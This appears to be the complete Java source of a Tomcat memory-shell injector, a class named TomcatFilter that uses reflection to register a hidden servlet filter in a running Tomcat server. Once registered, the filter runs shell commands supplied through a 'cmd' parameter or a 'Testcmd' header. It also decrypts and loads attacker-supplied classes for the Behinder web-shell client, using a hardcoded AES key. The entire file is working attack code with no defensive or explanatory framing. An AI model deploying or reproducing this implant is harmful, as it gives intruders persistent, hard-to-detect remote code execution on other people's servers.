package msshell;


import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
//import org.apache.tomcat.util.descriptor.web.FilterDef;
//import org.apache.tomcat.util.descriptor.web.FilterMap;
//import org.apache.catalina.deploy.FilterDef

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

/**
 * @author wh1t3p1g
 * @since 2023/3/1
 */
public class TomcatFilter implements Filter {

    private static String uri;
    private static String filterName = "DefaultFilter";

    private static String data = "test";

    private static Object response;

    private static String behinderHeader = "Padishah";
    private static String behinderPassword = "eac9fa38330a7535";//pass1024

//    public TomcatFilter(ClassLoader parent) {
//        super(parent);
//    }

    public TomcatFilter(String uri) {
    }

    public TomcatFilter() throws Exception {
        try {
            initEcho();
            writeBody(response, "try to inject");
            StandardContext standardContext = null;

            standardContext = getCtx1();
            if (standardContext == null) {
                writeBody(response, "getCtx1 failed");
                ThreadLocal threadLocal = getThreadLocal();
                if (threadLocal != null && threadLocal.get() != null) {
                    writeBody(response, "ThreadLocal success, try to inject to request");
                    javax.servlet.ServletRequest servletRequest = (javax.servlet.ServletRequest) threadLocal.get();
                    javax.servlet.ServletContext servletContext = servletRequest.getServletContext();

                    ApplicationContext applicationContext = (ApplicationContext) getFieldObject(servletContext, servletContext.getClass(), "context");

                    standardContext = (StandardContext) getFieldObject(applicationContext, applicationContext.getClass(), "context");

                } else {
                    writeBody(response, "ThreadLocal failed, try WebappClassLoaderBase");
                    WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                    StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
                    standardContext = (StandardContext) standardroot.getContext();
                }
            }
            if (standardContext == null) {
                writeBody(response, "Fail to get standardContext");
                return;
            }

            Map filterConfigs = (Map) getFieldObject(standardContext, standardContext.getClass(), "filterConfigs");

            if (filterConfigs.get(filterName) != null) {
                filterConfigs.remove(filterName); // 重新注册
            }
            writeBody(response, "before filter constructor");
            TomcatFilter filter = new TomcatFilter(uri);
            writeBody(response, "after filter constructor");


            Class filterDefClz;
            Class filterMapClz;
            Class standardContextClz = Class.forName("org.apache.catalina.core.StandardContext");
            try {
                //tomca7
                filterDefClz = Class.forName("org.apache.catalina.deploy.FilterDef");
            } catch (ClassNotFoundException e) {
                //tomcat8 9
                filterDefClz = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            }
            try {
                filterMapClz = Class.forName("org.apache.catalina.deploy.FilterMap");
            } catch (ClassNotFoundException e) {
                filterMapClz = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            }
            writeBody(response, "after get filterDef and filterMap");


            Object filterDef = filterDefClz.newInstance();
            writeBody(response, "after filterDef constructor");

//                filterDef.setFilterName(filterName);
            filterDefClz.getDeclaredMethod("setFilterName", String.class).invoke(filterDef, filterName);
            writeBody(response, "after setFilterName");

//                filterDef.setFilterClass(filter.getClass().getName());
            filterDefClz.getDeclaredMethod("setFilterClass", String.class).invoke(filterDef, filter.getClass().getName());
            writeBody(response, "after setFilterClass");

//                filterDef.setFilter(filter);
            filterDefClz.getDeclaredMethod("setFilter", Filter.class).invoke(filterDef, filter);
            writeBody(response, "after setFilter");

//                standardContext.addFilterDef(filterDef);
            standardContextClz.getDeclaredMethod("addFilterDef", filterDefClz).invoke(standardContext, filterDef);
            writeBody(response, "after addFilterDef");


            Object filterMap = filterMapClz.newInstance();
//                filterMap.addURLPattern(uri);
            filterMapClz.getDeclaredMethod("addURLPattern", String.class).invoke(filterMap, uri);
//                filterMap.setFilterName(filterName);
            filterMapClz.getDeclaredMethod("setFilterName", String.class).invoke(filterMap, filterName);
//                filterMap.setDispatcher(DispatcherType.REQUEST.name());
            filterMapClz.getDeclaredMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());

//                standardContext.addFilterMapBefore(filterMap);
            standardContextClz.getDeclaredMethod("addFilterMapBefore", filterMapClz).invoke(standardContext, filterMap);
            writeBody(response, "after addFilterMapBefore");

            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClz);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

            filterConfigs.put(filterName, filterConfig);
            writeBody(response, "inject success");


        } catch (Exception e) {
            writeBody(response, String.format("Exception when injecting: " + e.toString()));
        }
    }

    public void initEcho() throws Exception {
        Object o;
        Object resp;
        String s;
        boolean done = false;
        Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (int i = 0; i < ts.length; i++) {
            Thread t = ts[i];
            if (t == null) {
                continue;
            }
            s = t.getName();
            if (!s.contains("exec") && s.contains("http")) {
                o = getFV(t, "target");
                if (!(o instanceof Runnable)) {
                    continue;
                }

                try {
                    o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                } catch (Exception e) {
                    continue;
                }

                java.util.List ps = (java.util.List) getFV(o, "processors");
                for (int j = 0; j < ps.size(); j++) {
                    Object p = ps.get(j);
                    o = getFV(p, "req");
                    resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);
                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testecho"});
                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                        resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Testecho", s});
                        done = true;
                    }
                    s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testcmd"});
                    if (s != null && !s.isEmpty()) {
                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                        String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", s} : new String[]{"/bin/sh", "-c", s};
                        writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                        done = true;
                    }
                    if ((s == null || s.isEmpty()) && done) {
                        writeBody(resp, System.getProperties().toString().getBytes());
                    }

                    if (done) {
                        response = resp;
                        break;
                    }
                }
                if (done) {
                    break;
                }
            }
        }

    }


    public ThreadLocal getThreadLocal() throws Exception {
        Class<?> applicationDispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
        Field WRAP_SAME_OBJECT = getField(applicationDispatcher, "WRAP_SAME_OBJECT");
        Field modifiersField = getField(WRAP_SAME_OBJECT.getClass(), "modifiers");
        modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        if (!WRAP_SAME_OBJECT.getBoolean(null)) {
            WRAP_SAME_OBJECT.setBoolean(null, true);
        }

        //初始化 lastServicedRequest
        Class<?> applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        Field lastServicedRequest = getField(applicationFilterChain, "lastServicedRequest");
        modifiersField = getField(lastServicedRequest.getClass(), "modifiers");
        modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

        if (lastServicedRequest.get(null) == null) {
            lastServicedRequest.set(null, new ThreadLocal<>());
        }

        //初始化 lastServicedResponse
        Field lastServicedResponse = getField(applicationFilterChain, "lastServicedResponse");
        modifiersField = getField(lastServicedResponse.getClass(), "modifiers");
        modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

        if (lastServicedResponse.get(null) == null) {
            lastServicedResponse.set(null, new ThreadLocal<>());
        }

        ThreadLocal threadLocal = (ThreadLocal) getFieldObject(null, applicationFilterChain, "lastServicedRequest");
        return threadLocal;
    }

    //Success on local tomcat 7.0.54
    public StandardContext getCtx1() throws Exception {
        StandardContext resultCtx = null;
        String resultHost = "";
        String resultContainer = "";
        Thread thread = Thread.currentThread();
        Object threadGroup = getFV(thread, "group");
        if (!(threadGroup instanceof ThreadGroup)) {
            return null;
        }
        Thread[] threads = (Thread[]) getFV(threadGroup, "threads");
        for (int i = 0; i < threads.length; i++) {
            Thread current = threads[i];
            Object target = getFV(current, "target");
            if (!classNameContains(target, "ContainerBackgroundProcessor")) {
                continue;
            }
            Object this_0 = getFV(target, "this$0");
            if (!classNameContains(this_0, "StandardEngine")) {
                continue;
            }
            Object children = getFV(this_0, "children");
            if (!(children instanceof java.util.HashMap)) {
                continue;
            }
            java.util.HashMap hashMap = (java.util.HashMap) children;
            Iterator iterator = hashMap.entrySet().iterator();
            while (iterator.hasNext()) {
                Map.Entry entry = (Map.Entry) iterator.next();
                Object value = entry.getValue();
                if (!classNameContains(value, "StandardHost")) {
                    continue;
                }
                String host = (String) entry.getKey();
                Object children1 = getFV(value, "children");
                java.util.HashMap hashMap1 = (java.util.HashMap) children1;
                Iterator iterator1 = hashMap1.entrySet().iterator();
                while (iterator1.hasNext()) {
                    Map.Entry entry1 = (Map.Entry) iterator1.next();
                    Object value1 = entry1.getValue();
                    if (!classNameContains(value1, "StandardContext")) {
                        continue;
                    }
                    String container = (String) entry1.getKey();
                    writeBody(response, String.format("host: %s, container: %s", host, container));
                    if (resultCtx == null) {
                        resultCtx = (StandardContext) value1;
                        resultHost = host;
                        resultContainer = container;
                    }

                }
            }
        }
        writeBody(response, String.format("Injecting to host %s, container %s", resultHost, resultContainer));
        return resultCtx;
    }

    public static Object getFieldObject(Object obj, Class<?> cls, String fieldName) {
        Field field = getField(cls, fieldName);
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static Field getField(Class<?> cls, String fieldName) {
        Field field = null;
        try {
            field = cls.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (cls.getSuperclass() != null)
                field = getField(cls.getSuperclass(), fieldName);
        }
        return field;
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response1, FilterChain chain) throws IOException, ServletException {
        // TODO change
        HttpServletResponse resp = (HttpServletResponse) response1;
        HttpServletRequest req = (HttpServletRequest) request;
//        String retData = "{" +
//                "\"message\": \"" + data + "\"," +
//                "\"code\": \"200\"" +
//                "}";
        try {
            String s = (String) req.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(request, new Object[]{"cmd"});
            String h = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request, new Object[]{behinderHeader});
//            writeBody(response, String.format("Cmd : %s", s));
//            writeBody(response, String.format("behinder header: %s", h));
            if (s != null && !s.isEmpty()) {
                resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", s} : new String[]{"/bin/sh", "-c", s};
                writeBody2(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());
            } else if (h != null && !h.isEmpty()) {
                HttpSession session = ((HttpServletRequest) request).getSession();
                Map obj = new HashMap();
                obj.put("request", request);
                obj.put("response", resp);
                obj.put("session", session);
                try {
                    session.putValue("u", this.behinderPassword);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(this.behinderPassword.getBytes(), "AES"));
                    (new TomcatFilter()).g(c.doFinal(this.base64Decode(request.getReader().readLine()))).newInstance().equals(obj);
//                    (new TomcatFilter(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(request.getReader().readLine()))).newInstance().equals(obj);
                } catch (Exception var7) {
                    var7.printStackTrace();
                }
            } else {
                writeBody2(resp, System.getProperties().toString().getBytes());

            }
        } catch (Exception e) {
            try {
                writeBody2(resp, e.toString().getBytes());
            } catch (Exception ex) {

            }
        }

    }

    private static void writeBody2(Object resp, byte[] bs) throws Exception {
        String s = new String(bs, StandardCharsets.UTF_8);
        ((HttpServletResponse) resp).getWriter().write(s);
    }

    private static void writeBody(Object resp, String s) throws Exception {
        writeBody(resp, (s + "\n").getBytes());
    }

    private static void writeBody(Object resp, byte[] bs) throws Exception {
        Object o;
        Class clazz;
        try {
            clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            o = clazz.newInstance();
            clazz.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class})
                    .invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        } catch (ClassNotFoundException e) {
            clazz = Class.forName("java.nio.ByteBuffer");
            o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        } catch (NoSuchMethodException e) {
            clazz = Class.forName("java.nio.ByteBuffer");
            o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
            resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
        }
    }

    private static Object getFV(Object o, String s) throws Exception {
        java.lang.reflect.Field f = null;
        if (o == null) {
            return null;
        }
        Class clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                f = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (f == null) {
            throw new NoSuchFieldException(s);
        }
        f.setAccessible(true);
        return f.get(o);
    }

    public static boolean classNameEndWith(java.lang.Object target, java.lang.String keyword) {
        if (target == null) {
            return false;
        }
        return target.getClass().getName().endsWith(keyword);
    }

    public static boolean classNameContains(java.lang.Object target, java.lang.String keyword) {
        if (target == null) {
            return false;
        }
        return target.getClass().getName().contains(keyword);
    }

    // Behinder use current context classLoader
    public Class g(byte[] b) {
//        return super.defineClass(b, 0, b.length);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method method = null;
        try {
            method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
        method.setAccessible(true);
        try {
            return (Class) method.invoke(classLoader, b, 0, b.length);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        }
    }

    public String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
        } catch (Exception var4) {
        }
        return ret;
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) ((byte[]) ((byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str)));
        } catch (Exception var5) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke((Object) null);
            return (byte[]) ((byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str)));
        }
    }

    @Override
    public void destroy() {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

}
